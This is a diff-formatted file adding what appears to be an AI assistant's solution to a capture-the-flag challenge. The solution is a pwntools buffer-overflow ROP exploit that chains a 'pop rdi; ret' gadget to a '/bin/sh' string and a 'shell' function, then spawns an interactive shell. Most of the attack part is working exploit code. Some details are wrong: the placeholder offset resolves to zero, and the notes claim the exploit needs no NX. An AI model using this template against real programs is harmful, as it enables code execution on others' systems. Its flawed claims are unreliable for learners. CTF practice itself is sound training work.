@@ -1,0 +1,72 @@
+To solve this challenge using `pwntools`, we need to perform a Return-Oriented Programming (ROP) attack. The goal is to control the execution flow and eventually call the `shell` function, which will give us a shell.
+
+Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Analyze the Binary**: Understand the binary's structure, functions, and gadgets.
+2. **Find Useful Gadgets**: Identify gadgets that can help us build the ROP chain.
+3. **Build the ROP Chain**: Construct the ROP chain to call the `shell` function.
+4. **Exploit the Buffer Overflow**: Use the buffer overflow vulnerability to inject the ROP chain.
+5. **Run the Exploit**: Execute the exploit to get a shell.
+
+### Code:
+
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './rop'
+elf = context.binary = ELF(binary_path)
+p = process(binary_path)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Adjust this value based on the actual offset found by cyclic pattern
+
+# Find the address of the shell function
+shell_addr = elf.symbols['shell']
+
+# Find useful gadgets
+pop_rdi_ret = next(elf.search(asm('pop rdi; ret')))
+
+# Build the ROP chain
+rop_chain = b'A' * offset  # Padding to reach the return address
+rop_chain += p64(pop_rdi_ret)  # Pop the argument into RDI
+rop_chain += p64(next(elf.search(b'/bin/sh\x00')))  # Address of "/bin/sh" string
+rop_chain += p64(shell_addr)  # Call the shell function
+
+# Send the payload
+p.sendline(rop_chain)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+
+1. **Set up the process**:
+   - We use `ELF` to load the binary and `process` to start the binary.
+   
+2. **Find the offset to the return address**:
+   - Use `cyclic_find` to determine the exact offset where the return address is overwritten. This is typically done by sending a cyclic pattern and crashing the program to find the offset.
+
+3. **Find the address of the `shell` function**:
+   - Use `elf.symbols['shell']` to get the address of the `shell` function.
+
+4. **Find useful gadgets**:
+   - Use `next(elf.search(asm('pop rdi; ret')))` to find a gadget that pops a value into the `RDI` register and returns. This is necessary because the `system` function expects the argument in `RDI`.
+
+5. **Build the ROP chain**:
+   - Create a payload that includes padding to reach the return address, the gadget to pop the argument into `RDI`, the address of the string `/bin/sh`, and the address of the `shell` function.
+
+6. **Send the payload**:
+   - Use `p.sendline(rop_chain)` to send the payload to the binary.
+
+7. **Interact with the shell**:
+   - Use `p.interactive()` to interact with the shell once it is spawned.
+
+### Notes:
+- Ensure that the binary is compiled without stack protection (e.g., no stack canaries, no NX bit, etc.) for this exploit to work.
+- If the binary has ASLR enabled, you may need to leak an address to bypass it.
+- Adjust the offset and gadget addresses based on the actual binary and environment.
+
+This should give you a good starting point to solve the challenge. Good luck!
